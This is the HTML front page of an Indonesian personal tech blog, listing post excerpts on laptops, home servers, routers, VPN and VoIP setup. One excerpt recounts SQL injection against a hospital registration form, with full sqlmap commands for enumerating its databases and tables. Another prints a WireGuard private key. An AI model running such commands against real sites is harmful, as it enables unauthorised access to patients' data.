@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head>
+	<meta name="generator" content="Hugo 0.146.7"><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Just /var/log/</title>
+
+<meta name="description" content="Linux &amp; Cyber Security enthusiast">
+<meta name="author" content="Bembenk">
+<link rel="canonical" href="https://bembenk18.github.io/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css" integrity="sha256-IhHKMWS&#43;eDACT2qtKzouUghDpk&#43;PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://bembenk18.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://bembenk18.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://bembenk18.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://bembenk18.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://bembenk18.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="https://bembenk18.github.io/index.xml">
+<link rel="alternate" type="application/json" href="https://bembenk18.github.io/index.json">
+<link rel="alternate" hreflang="en" href="https://bembenk18.github.io/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-438PNW325R"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-438PNW325R');
+        }
+      </script><meta property="og:url" content="https://bembenk18.github.io/">
+  <meta property="og:site_name" content="Just /var/log/">
+  <meta property="og:title" content="Just /var/log/">
+  <meta property="og:description" content="Linux &amp; Cyber Security enthusiast">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Just /var/log/">
+<meta name="twitter:description" content="Linux &amp; Cyber Security enthusiast">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "Just /var/log/",
+  "url": "https://bembenk18.github.io/",
+  "description": "Linux \u0026 Cyber Security enthusiast",
+  "logo": "https://bembenk18.github.io/favicon.ico",
+  "sameAs": [
+      
+  ]
+}
+</script>
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://bembenk18.github.io/" accesskey="h" title="Just /var/log/ (Alt + H)">Just /var/log/</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://bembenk18.github.io/" title="Home">
+                    <span class="active">Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://bembenk18.github.io/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://bembenk18.github.io/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://bembenk18.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+
+<article class="first-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Perjalanan T480 Dimulai
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>
+Karena kebutuhan komputasi sudah tidak lagi bisa ditangani oleh T470, saya memutuskan untuk upgrade laptop. Awalnya saya berniat membeli ThinkPad T14 Gen 2 AMD atau P14s, tetapi batal setelah melihat bahwa T480 memiliki opsi upgrade yang lebih luas—terutama dukungan untuk dual storage.
+Akhirnya, saya memilih membeli T480 dari seller ThinkPad Salatiga di Tokopedia dengan harga Rp 3.672.000. Unitnya masih sangat mulus, dan konfigurasi awalnya adalah sebagai berikut:
+No Komponen Spesifikasi 1 CPU Intel i5-8350U (4C/4T @ 1.7GHz) 2 RAM 16GB DDR4 Single Channel 3 SSD 256GB SATA Sandisk 4 Layar FHD Touchscreen 5 Adaptor 65W USB Type-C Original 6 Baterai 2x24Wh (20Wh internal, 19&#43;Wh eksternal) 📅 16 Maret 2025 Laptop datang dengan Windows 11 Original. Namun, karena workflow saya lebih cocok di Linux, SSD Adata 512GB dari T470 saya kanibal dan pindahkan ke T480. SSD ini berisi openSUSE Tumbleweed yang telah saya gunakan selama kurang lebih 1,5 tahun.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-04-02 07:49:16 +0700 WIB'>2025-04-02</span>&nbsp;·&nbsp;Bembenk</footer>
+  <a class="entry-link" aria-label="post link to Perjalanan T480 Dimulai" href="https://bembenk18.github.io/post/perjalanan-t480-dimulai/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Cerita mendapatkan FlightFeeder dari FlightAware
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Saya kenal dunia ADS-B saat scroll post lama di group Orange Pi Indonesia dan tidak sengaja membaca post tentang ADS-B untuk tracking penerbangan. ADS-B (Automatic Dependent Surveillance-Broadcast) merupakan teknologi pengawasan penerbangan yang menggunakan transponder untuk memancarkan informasi posisi, kecepatan, ketinggian dan arah pesawat melalui gelombang radio.
+Untuk post yang saya sebut diatas, kita bertindak sebagai Ground Station yang akan mengirimkan data ke layanan pelacakan pesawat (FlightAware, Flightradar24, Airnav, dsb). Sebenarnya kita bisa build sendiri perangkat untuk melacaknya denggan raspberry pi, namun kali ini saya akan bahas tentang mendapatkan secara gratis dari FlightAware.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-03-29 04:50:07 +0700 WIB'>2025-03-29</span>&nbsp;·&nbsp;Bembenk</footer>
+  <a class="entry-link" aria-label="post link to Cerita mendapatkan FlightFeeder dari FlightAware" href="https://bembenk18.github.io/post/cerita-mendapatkan-flightfeeder-flightaware/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Upgrade Home Server
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>
+Masih ingat dengan postingan home server ini? Karena makin besar keperluan komputasi akhirnya memutuskan untuk upgrade ke mesin yang lebih besar.
+Ada beberapa pertimbangan diantaranya adalah ukuran yang kecil dan kosumsi daya bisa serendah mungkin tapi tetap powerffull, beberapa kriteria adalah sebagai berikut:
+Dell Wyse 5070 Dell Optiplex 3050 Lenovo Thinkcentre M710Q Dari 3 pilihan diatas akhirnya memutuskan meminang Thinkcentre M710Q dengan spesifikasi:
+Core i3 7100T 2C/4T 3.40 GHz 35W 16 GB DDR4 2400 (2x8GB) PC ini saya beli tanpa SSD, karena sudah ada SSD M.2 Sata copotan laptop (Catat M.2). Setelah sampai gas langsung install Proxmox di mesin ini, karena gak ada keyboard akhirnya install di laptop dulu kemudian pindah ke mesin ini. Setelah booting lah kok gak terdeteksi? dan ternyata hanya support SSD NVME bukan M.2 Sata (LOL).
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-10-31 10:25:29 +0700 WIB'>2024-10-31</span>&nbsp;·&nbsp;Bembenk</footer>
+  <a class="entry-link" aria-label="post link to Upgrade Home Server" href="https://bembenk18.github.io/post/upgrade-home-server/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Flash OpenWrt TP Link WR1043ND
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Pendahuluan Saat ini internet di rumah saya memiliki kecepatan 30Mb/s, namun baru sadar kalau speed wireless dari mikrotik RB941 mentok 15Mb/s pada jarak 5 meter (mungkin karena cuma pakai antena internal saja). Setelah mencari router yang cocok, ada 2 pilihan sebagai berikut:
+Model Wireless Port RJ45 Harga Mi 4 Gigabit 2.4G &amp; 5G 3 / Gigabit 350k TP-Link TL WR1043ND v2.1 2.4G 5 / Gigabit &lt; 150K (Bekas) Setelah beberapa pertimbangan akhirnya pilih TP-Link dengan harga 128k (diskon jadi 78k wkwkwk), karena ini router tua jadi beberapa fitur sudah tertinggal, jadi agar lebih optimal maka saya akan coba flash dengan firmware OpenWrt. Disini saya pakai firmware ROOter
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-09-14 14:57:38 +0700 WIB'>2024-09-14</span>&nbsp;·&nbsp;Bembenk</footer>
+  <a class="entry-link" aria-label="post link to Flash OpenWrt TP Link WR1043ND" href="https://bembenk18.github.io/post/flash-openwrt-tp-link-wr1043nd/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Setup Cloudflare Warp on Mikrotik
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Sesuai sabda pak Anton Wibowo tentang VPN dibawah ini, maka saya akan coba setup Cloudflare Warp di Mikrotik Karena disini kita akan pakai Wireguard maka wajib menggunakan RouterOS versi 7.
+Buat akun Warp Untuk membuat akun disini saya akan pakai tools ini https://github.com/ViRb3/wgcf (Silahkan dibaca sendiri tutorialnya:v) Setelah itu kita akan mendapatkan file wgcf-profile.conf yang berisi ➜ Network cat wgcf-profile.conf [Interface] PrivateKey = mAmDoyJ8Qf/2sEyuhjhPytLDtx8ioiEaJh3q8K8iE3u2U= Address = 172.16.0.2/32 Address = 2606:4700:110:84ca:7d82:b1d:7534:56f9/128 DNS = 1.1.1.1, 1.0.0.1, 2606:4700:4700::1111, 2606:4700:4700::1001 MTU = 1280 [Peer] PublicKey = bmXOC&#43;F1FxEHF9jjiK2H5/1SUtzH0JuVo51h2wPfgyo= AllowedIPs = 0.0.0.0/0 AllowedIPs = ::/0 Endpoint = engage.cloudflareclient.com:2408 ➜ Network Setup Mikrotik Buat Wireguard baru dan sesuaikan dengan config profile yang sudah kita dapatkan (Edit pada bagian MTU &amp; Private key) Buat Wireguard Peer sesuaikan juga Public Key, Endpoint dan Endpoint Port dengan profile Buat address baru dengan IP 172.16.0.2/32 dan Interface WARP Ubah DNS ke 1.1.1.1 Buat Routing Table baru dengan nama Cloudflare Tambahkan Route baru dengan gateway WARP Buat NAT baru dengan Out Interface WARP dan action masquerade (Pastikan nat ini berada paling atas) /ip firewall nat add action=masquerade chain=srcnat disabled=no log=no log-prefix=&#34;&#34; out-interface=WARP Tambahkan mange baru /ip firewall mangle set *1 action=mark-routing chain=prerouting disabled=no log=no log-prefix=&#34;&#34; new-routing-mark=Cloudflare passthrough=no src-address=192.168.xx.xx-192.168.xx.xx Testing Sebelum Routing Terlihat traffic masih mengarah ke ISP ...</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-08-25 05:46:19 +0700 WIB'>2024-08-25</span>&nbsp;·&nbsp;Bembenk</footer>
+  <a class="entry-link" aria-label="post link to Setup Cloudflare Warp on Mikrotik" href="https://bembenk18.github.io/post/cloudflare-warp-on-mikrotik/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Manually Build Vyos
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>
+Kapan kita perlu build Vyos manual? karena di website Vyos hanya tersedia versi Rolling Release untuk versi gratis.
+Requirements Debian Jessie untuk VyOS 1.2 (crux) Debian Buster untuk VyOS 1.3 (equuleus) Debian Bookworm untuk VyOS 1.4 (sagitta) Debian Bookworm untuk VyOS 1.5 &amp; rolling release Clone repository # VyOS 1.2 (crux) $ git clone -b crux --single-branch https://github.com/vyos/vyos-build # VyOS 1.3 (equuleus) $ git clone -b equuleus --single-branch https://github.com/vyos/vyos-build # VyOS 1.4 (sagitta) $ git clone -b sagitta --single-branch https://github.com/vyos/vyos-build # VyOS 1.5 (circinus,current) $ git clone -b current --single-branch https://github.com/vyos/vyos-build Start Build $ cd vyos-build # VyOS 1.2 (crux) and VyOS 1.3 (equuleus) $ ./configure --architecture amd64 --build-by &#34;j.randomhacker@vyos.io&#34; $ sudo make iso # VyOS 1.4 (sagitta) $ sudo make clean $ sudo ./build-vyos-image iso --architecture amd64 --build-by &#34;j.randomhacker@vyos.io&#34; # VyOS 1.5 (circinus,current) $ sudo make clean $ sudo ./build-vyos-image generic --architecture amd64 --build-by &#34;j.randomhacker@vyos.io&#34; Jika berhasil maka hasil build akan berada dalam folder build
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-07-10 10:20:20 +0700 WIB'>2024-07-10</span>&nbsp;·&nbsp;Bembenk</footer>
+  <a class="entry-link" aria-label="post link to Manually Build Vyos" href="https://bembenk18.github.io/post/manually-build-vyos/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Install Kamailio VOIP Server
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>
+Pengenalan Kamailio adalah Server SIP Sumber Terbuka yang kuat, dapat menangani ribuan panggilan per detik. Dapat digunakan untuk membangun platform besar VoIP dan komunikasi real-time seperti pesan instan, keberadaan, dan WebRTC. Fiturnya mencakup komunikasi aman, penyeimbangan beban, otentikasi, dan dukungan untuk berbagai sistem backend. Cocok untuk gateway SIP, PBX, dan server media seperti Asterisk dan FreeSWITCH.
+Proses installasi Tambahkan repositori root@aml:~# cat /etc/apt/sources.list deb http://deb.kamailio.org/kamailio55 buster main deb-src http://deb.kamailio.org/kamailio55 buster main Install mariadb dan kamailio apt install mariadb-server kamailio kamailio-mysql-modules kamailio-ims-modules Edit file konfigurasi kamailio (edit baris berikut ini) root@aml:~# cat /etc/kamailio/kamctlrc SIP_DOMAIN=192.168.0.100 DBENGINE=MYSQL DBHOST=localhost DBPORT=3306 DBNAME=kamailio DB_PATH=&#34;/usr/local/etc/kamailio/dbtext&#34; DBRWUSER=&#34;user&#34; DBRWPW=&#34;password&#34; DBROUSER=&#34;user&#34; DBROPW=&#34;password&#34; DBACCESSHOST=192.168.0.100 DBROOTUSER=&#34;root&#34; Ini juga root@aml:~# cat /etc/default/kamailio RUN_KAMAILIO=yes USER=kamailio GROUP=kamailio root@aml:~# Restart service sudo service kamailio restart netstat -ntulp | grep kamailio Jalankan perintah untuk membuat database (ikuti semua intruksi) root@aml:~# kamdbctl create MySQL password for root: root@aml:~# Buat user baru kamctl add 1234 halo * 123: username, halo: password Pengujian pada VOIP client Login ke Linphone dengan user tadi seperti ini ...</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-05-13 11:07:09 +0700 WIB'>2024-05-13</span>&nbsp;·&nbsp;Bembenk</footer>
+  <a class="entry-link" aria-label="post link to Install Kamailio VOIP Server" href="https://bembenk18.github.io/post/install-kamailio-voip-server/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">P1 SQL Injection Form Pendaftaran Rumah Sakit
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Saat akan daftar disalah satu rumah sakit tiba tiba kepikiran bisa gak sih form iin di inject?
+POC Buka form pendaftaran, isikan dengan random data Intercept post data dengan OWASP ZAP Setelah itu coba dengan sqlmap sqlmap -u https://redacted.com/index.php/CProsesDaftar/getpasien&#34; --data=&#34;nomrm=Halo&amp;tgllahir=2025-05-07&amp;nik=9827982798279827&amp;search=nomrm&amp;tglperiksa=2023-12-07&#34; --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --dbs --threads 2 Lihat isi table invoice sqlmap -u &#34;https://redacted.com/index.php/CProsesDaftar/getpasien&#34; --data=&#34;nomrm=Halo&amp;tgllahir=2025-05-07&amp;nik=9827982798279827&amp;search=nomrm&amp;tglperiksa=2023-12-07&#34; --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --threads 2 -D redacted-database --tables ...</p>
+  </div>
+  <footer class="entry-footer"><span title='2023-12-28 13:39:57 +0700 WIB'>2023-12-28</span>&nbsp;·&nbsp;Bembenk</footer>
+  <a class="entry-link" aria-label="post link to P1 SQL Injection Form Pendaftaran Rumah Sakit" href="https://bembenk18.github.io/post/sql-injection-form-pendaftaran-rumah-sakit/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Allow Winbox Discovery
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Secara default winbox di openSUSE tidak menampilkan Neighbors karena terblokir oleh firewall. Kita harus allow manual.
+sudo firewall-cmd --permanent --service=winbox-discover --add-port=5678/udp sudo firewall-cmd --zone=public --add-service=winbox-discover --permanent sudo firewall-cmd --reload </p>
+  </div>
+  <footer class="entry-footer"><span title='2023-11-18 13:18:23 +0700 WIB'>2023-11-18</span>&nbsp;·&nbsp;Bembenk</footer>
+  <a class="entry-link" aria-label="post link to Allow Winbox Discovery" href="https://bembenk18.github.io/post/allow-winbox-discovery/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Solo to Solo | LOUCA 2023
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>
+Halo semua, disini aku mau berbagi pengalaman ikut LibreOffice Conf. Asia UbuCon Asia 2023 atau bisa disingkat LOUCA23.
+Sebenarnya aku mau berangkat berdua dengan temanku tapi dia batal berangkat karena sakit, yo wes lah karena sudah booking tiket kereta dan penginapan mau gak mau aku harus berangkat sendiri biar gak terlalu rugi wkwkwk.
+Day 0 (Jumat 06 Oktober 2023) Sekitar jam 14:30 aku berangkat dari tempat kerja ke stasiun dan kereta berangkat dari stasiun Jombang jam 15:10. Singkat cerita sekitar jam 18:10 sampai di Stasiun Solo Balapan, Jarak stasiun ke penginapan ±3KM lumayan juga kalo jalan, yo wes lah naik Gojek aja paling gak sampai 20k. ...</p>
+  </div>
+  <footer class="entry-footer"><span title='2023-10-17 16:05:36 +0700 WIB'>2023-10-17</span>&nbsp;·&nbsp;Bembenk</footer>
+  <a class="entry-link" aria-label="post link to Solo to Solo | LOUCA 2023" href="https://bembenk18.github.io/post/louca23/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="next" href="https://bembenk18.github.io/page/2/">Next&nbsp;&nbsp;»
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+        <span>Bembenk</span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
